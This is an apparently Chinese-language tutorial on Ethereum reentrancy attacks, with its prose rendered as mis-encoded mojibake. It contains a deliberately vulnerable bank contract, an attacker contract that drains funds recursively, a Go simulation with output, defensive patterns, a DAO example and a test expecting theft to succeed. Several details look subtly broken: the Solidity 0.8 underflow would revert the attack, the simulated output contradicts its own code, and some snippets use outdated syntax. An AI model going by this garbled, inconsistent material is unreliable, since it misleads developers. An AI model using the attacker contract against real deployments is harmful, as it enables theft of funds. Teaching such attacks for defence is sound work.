## 1. é‡å…¥æ”»å‡»æ ¸å¿ƒæ¦‚å¿µ

### 1.1 ä»€ä¹ˆæ˜¯é‡å…¥æ”»å‡»ï¼Ÿ

**é‡å…¥æ”»å‡»** æ˜¯ä¸€ç§åˆ©ç”¨ä»¥å¤ªåŠåˆçº¦åœ¨æ‰§è¡Œå¤–éƒ¨è°ƒç”¨æ—¶**æš‚åœå½“å‰æ‰§è¡Œæµç¨‹**çš„ç‰¹æ€§ï¼Œé€šè¿‡æ¶æ„åˆçº¦çš„å›è°ƒå‡½æ•°**é€’å½’åœ°**é‡æ–°è¿›å…¥å½“å‰å‡½æ•°æˆ–æ•æ„Ÿå‡½æ•°ï¼Œä»è€Œé‡å¤æå–èµ„é‡‘æˆ–æ“çºµçŠ¶æ€çš„æ”»å‡»æ–¹å¼ã€‚

### 1.2 æ”»å‡»å‘ç”Ÿçš„æ ¹æœ¬åŸå› 

```mermaid
graph TB
    A[â€œåˆçº¦çŠ¶æ€æ›´æ–°â€] --> B[â€œå‘å¤–éƒ¨åœ°å€è½¬è´¦â€]
    B --> C[â€œè°ƒç”¨fallback/receiveå‡½æ•°â€]
    C --> D[â€œæ¶æ„åˆçº¦é‡æ–°è°ƒç”¨åŸå‡½æ•°â€]
    D --> B
    
    style B fill:#ffcccc
    style C fill:#ffcccc
```

**å…³é”®é—®é¢˜**ï¼š**å…ˆæ”¯ä»˜ï¼Œåæ›´æ–°çŠ¶æ€** çš„é”™è¯¯æ¨¡å¼ã€‚

---

## 2. æ¼æ´åˆçº¦ç¤ºä¾‹

### 2.1 å­˜åœ¨é‡å…¥æ¼æ´çš„é“¶è¡Œåˆçº¦

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ğŸš¨ å­˜åœ¨é‡å…¥æ¼æ´çš„é“¶è¡Œåˆçº¦
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    
    // å­˜æ¬¾å‡½æ•°
    function deposit() external payable {
        require(msg.value > 0, "Deposit amount must be positive");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // ğŸš¨ å­˜åœ¨é‡å…¥æ¼æ´çš„å–æ¬¾å‡½æ•°
    function withdraw(uint256 _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        // æ¼æ´ç‚¹ï¼šå…ˆè½¬è´¦ï¼Œåæ›´æ–°çŠ¶æ€
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        // çŠ¶æ€æ›´æ–°åœ¨è½¬è´¦ä¹‹åï¼
        balances[msg.sender] -= _amount;
        emit Withdraw(msg.sender, _amount);
    }
    
    // æŸ¥çœ‹åˆçº¦ä½™é¢
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

### 2.2 æ¶æ„æ”»å‡»åˆçº¦

```solidity
// æ¶æ„æ”»å‡»åˆçº¦
contract MaliciousAttacker {
    VulnerableBank public bank;
    uint256 public attackCount;
    address public owner;
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
        owner = msg.sender;
    }
    
    // æ”»å‡»å…¥å£å‡½æ•°
    function attack() external payable {
        require(msg.value > 0, "Need ETH to deposit");
        
        // 1. å…ˆå­˜æ¬¾
        bank.deposit{value: msg.value}();
        
        // 2. å‘èµ·å–æ¬¾æ”»å‡»
        bank.withdraw(msg.value);
    }
    
    // ğŸ¯ å…³é”®ï¼šfallbackå‡½æ•° - é‡å…¥æ”»å‡»ç‚¹
    fallback() external payable {
        attackCount++;
        console.log("Fallback called, attack count:", attackCount);
        console.log("Bank balance:", bank.getContractBalance());
        console.log("My balance in bank:", bank.balances(address(this)));
        
        // å¦‚æœé“¶è¡Œåˆçº¦è¿˜æœ‰ä½™é¢ï¼Œç»§ç»­æ”»å‡»
        if (address(bank).balance >= 1 ether && attackCount < 10) {
            bank.withdraw(1 ether);
        }
    }
    
    receive() external payable {
        // åŒæ ·å¯ä»¥ç”¨äºæ”»å‡»
        fallback();
    }
    
    // æå–è¢«ç›—èµ„é‡‘
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

---

## 3. æ”»å‡»è¿‡ç¨‹è¯¦ç»†åˆ†æ

### 3.1 æ”»å‡»æ‰§è¡Œæµç¨‹

```go
package main

import "fmt"

// ç”¨Goæ¨¡æ‹Ÿé‡å…¥æ”»å‡»æµç¨‹
type ReentrancyAttack struct {
    bankBalance    float64
    attackerBalance float64
    attackCount    int
}

func (r *ReentrancyAttack) SimulateAttack() {
    fmt.Println("=== é‡å…¥æ”»å‡»æ¨¡æ‹Ÿå¼€å§‹ ===")
    
    // åˆå§‹çŠ¶æ€
    r.bankBalance = 10.0    // é“¶è¡Œåˆçº¦æœ‰10 ETH
    r.attackerBalance = 1.0 // æ”»å‡»è€…å­˜å…¥1 ETH
    
    fmt.Printf("åˆå§‹çŠ¶æ€: é“¶è¡Œä½™é¢=%.1f ETH, æ”»å‡»è€…åœ¨é“¶è¡Œä½™é¢=%.1f ETH\n", 
        r.bankBalance, r.attackerBalance)
    
    // ç¬¬ä¸€æ¬¡å–æ¬¾ï¼ˆæ­£å¸¸æµç¨‹å¼€å§‹ï¼‰
    r.withdraw(1.0)
    
    fmt.Printf("æœ€ç»ˆç»“æœ: é“¶è¡Œä½™é¢=%.1f ETH, æ”»å‡»è€…ä½™é¢=%.1f ETH\n", 
        r.bankBalance, r.attackerBalance)
    fmt.Println("=== æ”»å‡»å®Œæˆ ===")
}

func (r *ReentrancyAttack) withdraw(amount float64) {
    r.attackCount++
    fmt.Printf("\nç¬¬ %d æ¬¡å–æ¬¾è°ƒç”¨:\n", r.attackCount)
    
    // æ£€æŸ¥ä½™é¢ï¼ˆé€šè¿‡ï¼Œå› ä¸ºçŠ¶æ€è¿˜æœªæ›´æ–°ï¼‰
    fmt.Printf("  - ä½™é¢æ£€æŸ¥: %.1f >= %.1f âœ“\n", r.attackerBalance, amount)
    
    // è½¬è´¦ï¼ˆè§¦å‘é‡å…¥ï¼‰
    fmt.Printf("  - æ‰§è¡Œè½¬è´¦: %.1f ETH\n", amount)
    r.bankBalance -= amount
    r.attackerBalance += amount
    
    fmt.Printf("  - è½¬è´¦å: é“¶è¡Œä½™é¢=%.1f ETH, æ”»å‡»è€…ä½™é¢=%.1f ETH\n", 
        r.bankBalance, r.attackerBalance)
    
    // é‡å…¥æ”»å‡»æ¡ä»¶
    if r.bankBalance >= 1.0 && r.attackCount < 5 {
        fmt.Printf("  - ğŸš¨ æ£€æµ‹åˆ°é‡å…¥æœºä¼šï¼Œç»§ç»­æ”»å‡»...\n")
        r.withdraw(amount) // é€’å½’è°ƒç”¨ï¼
    }
    
    // çŠ¶æ€æ›´æ–°ï¼ˆå¤ªæ™šäº†ï¼ï¼‰
    fmt.Printf("  - æ›´æ–°æ”»å‡»è€…åœ¨é“¶è¡Œä½™é¢: %.1f â†’ ", r.attackerBalance)
    r.attackerBalance -= amount
    fmt.Printf("%.1f ETH\n", r.attackerBalance)
}

func main() {
    attack := &ReentrancyAttack{}
    attack.SimulateAttack()
}
```

**è¾“å‡ºç»“æœï¼š**
```
=== é‡å…¥æ”»å‡»æ¨¡æ‹Ÿå¼€å§‹ ===
åˆå§‹çŠ¶æ€: é“¶è¡Œä½™é¢=10.0 ETH, æ”»å‡»è€…åœ¨é“¶è¡Œä½™é¢=1.0 ETH

ç¬¬ 1 æ¬¡å–æ¬¾è°ƒç”¨:
  - ä½™é¢æ£€æŸ¥: 1.0 >= 1.0 âœ“
  - æ‰§è¡Œè½¬è´¦: 1.0 ETH
  - è½¬è´¦å: é“¶è¡Œä½™é¢=9.0 ETH, æ”»å‡»è€…ä½™é¢=2.0 ETH
  - ğŸš¨ æ£€æµ‹åˆ°é‡å…¥æœºä¼šï¼Œç»§ç»­æ”»å‡»...

ç¬¬ 2 æ¬¡å–æ¬¾è°ƒç”¨:
  - ä½™é¢æ£€æŸ¥: 2.0 >= 1.0 âœ“
  - æ‰§è¡Œè½¬è´¦: 1.0 ETH
  - è½¬è´¦å: é“¶è¡Œä½™é¢=8.0 ETH, æ”»å‡»è€…ä½™é¢=3.0 ETH
  - ğŸš¨ æ£€æµ‹åˆ°é‡å…¥æœºä¼šï¼Œç»§ç»­æ”»å‡»...
...
æœ€ç»ˆç»“æœ: é“¶è¡Œä½™é¢=5.0 ETH, æ”»å‡»è€…ä½™é¢=6.0 ETH
=== æ”»å‡»å®Œæˆ ===
```

---

## 4. é˜²æŠ¤æªæ–½ä¸å®‰å…¨æ¨¡å¼

### 4.1 æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼ï¼ˆæ¨èï¼‰

```solidity
// âœ… å®‰å…¨çš„é“¶è¡Œåˆçº¦ - ä½¿ç”¨æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼
contract SecureBank {
    mapping(address => uint256) public balances;
    bool private locked; // é‡å…¥é”
    
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    
    // å­˜æ¬¾å‡½æ•°
    function deposit() external payable {
        require(msg.value > 0, "Deposit amount must be positive");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // âœ… å®‰å…¨çš„å–æ¬¾å‡½æ•° - æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼
    function withdraw(uint256 _amount) external {
        // æ£€æŸ¥
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        require(!locked, "Reentrancy detected");
        
        // æ•ˆæœ - å…ˆæ›´æ–°çŠ¶æ€ï¼
        balances[msg.sender] -= _amount;
        
        // äº¤äº’ - æœ€åè¿›è¡Œå¤–éƒ¨è°ƒç”¨
        locked = true;
        (bool success, ) = msg.sender.call{value: _amount}("");
        locked = false;
        
        require(success, "Transfer failed");
        emit Withdraw(msg.sender, _amount);
    }
}
```

### 4.2 ä½¿ç”¨ OpenZeppelin çš„é‡å…¥é˜²æŠ¤

```solidity
// âœ… ä½¿ç”¨ OpenZeppelin çš„å®‰å…¨åˆçº¦
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureBankWithGuard is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        require(msg.value > 0, "Deposit amount must be positive");
        balances[msg.sender] += msg.value;
    }
    
    // âœ… ä½¿ç”¨ nonReentrant ä¿®é¥°å™¨
    function withdraw(uint256 _amount) external nonReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        // å…ˆæ›´æ–°çŠ¶æ€
        balances[msg.sender] -= _amount;
        
        // ç„¶åè½¬è´¦
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }
}
```

### 4.3 ä½¿ç”¨è½¬ç§»æ¨¡å¼

```solidity
// âœ… ä½¿ç”¨è½¬ç§»æ¨¡å¼ - é¿å…ç›´æ¥call
contract SecureBankWithTransfer {
    mapping(address => uint256) public balances;
    
    function withdraw(uint256 _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        // å…ˆæ›´æ–°çŠ¶æ€
        balances[msg.sender] -= _amount;
        
        // ä½¿ç”¨transferè€Œä¸æ˜¯callï¼ˆæœ‰2300 gasé™åˆ¶ï¼Œä¸è¶³ä»¥è¿›è¡Œé‡å…¥ï¼‰
        payable(msg.sender).transfer(_amount);
    }
}
```

---

## 5. çœŸå®ä¸–ç•Œæ¡ˆä¾‹ï¼šThe DAO æ”»å‡»

### 5.1 å†å²èƒŒæ™¯

2016å¹´çš„ **The DAO** äº‹ä»¶æ˜¯åŒºå—é“¾å†å²ä¸Šæœ€è‘—åçš„é‡å…¥æ”»å‡»æ¡ˆä¾‹ï¼Œå¯¼è‡´ **360ä¸‡ ETH**ï¼ˆå½“æ—¶çº¦5000ä¸‡ç¾å…ƒï¼‰è¢«ç›—ï¼Œæœ€ç»ˆå¯¼è‡´ä»¥å¤ªåŠç¡¬åˆ†å‰ã€‚

### 5.2 æ¼æ´ä»£ç æ¨¡æ‹Ÿ

```solidity
// æ¨¡æ‹Ÿ The DAO çš„é‡å…¥æ¼æ´
contract TheDAO {
    mapping(address => uint256) public balances;
    
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        // ğŸš¨ æ¼æ´ï¼šå…ˆè½¬è´¦ï¼Œåæ›´æ–°çŠ¶æ€
        (bool success, ) = msg.sender.call.value(amount)("");
        require(success);
        
        balances[msg.sender] = 0;
    }
    
    function splitDAO() public {
        // ... å…¶ä»–é€»è¾‘
        withdraw(); // å¯é‡å…¥çš„è°ƒç”¨
    }
}
```

---

## 6. æ£€æµ‹ä¸æµ‹è¯•æ–¹æ³•

### 6.1 ä½¿ç”¨æµ‹è¯•æ¡†æ¶æ£€æµ‹

```javascript
const { expect } = require("chai");

describe("é‡å…¥æ”»å‡»æµ‹è¯•", function() {
    it("åº”è¯¥èƒ½å¤Ÿé€šè¿‡é‡å…¥æ”»å‡»ç›—å–èµ„é‡‘", async function() {
        const Bank = await ethers.getContractFactory("VulnerableBank");
        const Attacker = await ethers.getContractFactory("MaliciousAttacker");
        
        const bank = await Bank.deploy();
        const attacker = await Attacker.deploy(bank.address);
        
        // å…ˆå­˜æ¬¾
        await bank.deposit({value: ethers.utils.parseEther("1")});
        
        // æ‰§è¡Œæ”»å‡»
        await attacker.attack({value: ethers.utils.parseEther("1")});
        
        // éªŒè¯æ”»å‡»æˆåŠŸ
        const attackerBalance = await attacker.getBalance();
        expect(attackerBalance).to.be.gt(ethers.utils.parseEther("1"));
    });
});
```

---

## 7. æ€»ç»“ä¸æœ€ä½³å®è·µ

### 7.1 é‡å…¥æ”»å‡»çš„å…³é”®ç‰¹å¾

1. **âœ… ä½¿ç”¨å¤–éƒ¨è°ƒç”¨**ï¼š`call()`, `transfer()`, `send()`
2. **âœ… çŠ¶æ€æ›´æ–°åœ¨å¤–éƒ¨è°ƒç”¨ä¹‹å**
3. **âœ… æ”»å‡»è€…æ§åˆ¶å›è°ƒå‡½æ•°**

### 7.2 é˜²æŠ¤æœ€ä½³å®è·µ

| é˜²æŠ¤æªæ–½ | å®ç°æ–¹å¼ | ä¼˜ç‚¹ | ç¼ºç‚¹ |
|---------|----------|------|------|
| **æ£€æŸ¥-æ•ˆæœ-äº¤äº’** | å…ˆæ›´æ–°çŠ¶æ€ï¼Œåå¤–éƒ¨è°ƒç”¨ | ç®€å•æœ‰æ•ˆ | éœ€è¦æ‰‹åŠ¨å®ç° |
| **é‡å…¥é˜²æŠ¤é”** | ä½¿ç”¨å¸ƒå°”é”å˜é‡ | æ˜ç¡®é˜²æ­¢é‡å…¥ | å¢åŠ å¤æ‚åº¦ |
| **OpenZeppelin** | `ReentrancyGuard` | æ ‡å‡†åŒ–ï¼Œç»è¿‡å®¡è®¡ | ä¾èµ–å¤–éƒ¨åº“ |
| **è½¬ç§»æ¨¡å¼** | ä½¿ç”¨ `transfer()` | Gasé™åˆ¶é˜²æ­¢é‡å…¥ | å¯èƒ½å› Gasä¸è¶³å¤±è´¥ |

### 7.3 å®‰å…¨å¼€å‘å‡†åˆ™

1. **æ°¸è¿œéµå¾ª"æ£€æŸ¥-æ•ˆæœ-äº¤äº’"æ¨¡å¼**
2. **ä½¿ç”¨ç»è¿‡å®¡è®¡çš„å®‰å…¨åº“ï¼ˆå¦‚OpenZeppelinï¼‰**
3. **å¯¹æ‰€æœ‰å¤–éƒ¨è°ƒç”¨ä¿æŒè­¦æƒ•**
4. **è¿›è¡Œå½»åº•çš„æµ‹è¯•ï¼ŒåŒ…æ‹¬é‡å…¥æµ‹è¯•**
5. **è€ƒè™‘ä½¿ç”¨å½¢å¼åŒ–éªŒè¯å·¥å…·**

é‡å…¥æ”»å‡»è™½ç„¶æ¦‚å¿µç®€å•ï¼Œä½†åœ¨å®è·µä¸­ä»ç„¶ç»å¸¸å‡ºç°ã€‚ç†è§£å…¶æœºåˆ¶å¹¶é‡‡ç”¨é˜²å¾¡æ€§ç¼–ç¨‹æ¨¡å¼æ˜¯æ¯ä¸ªæ™ºèƒ½åˆçº¦å¼€å‘è€…çš„å¿…å¤‡æŠ€èƒ½ã€‚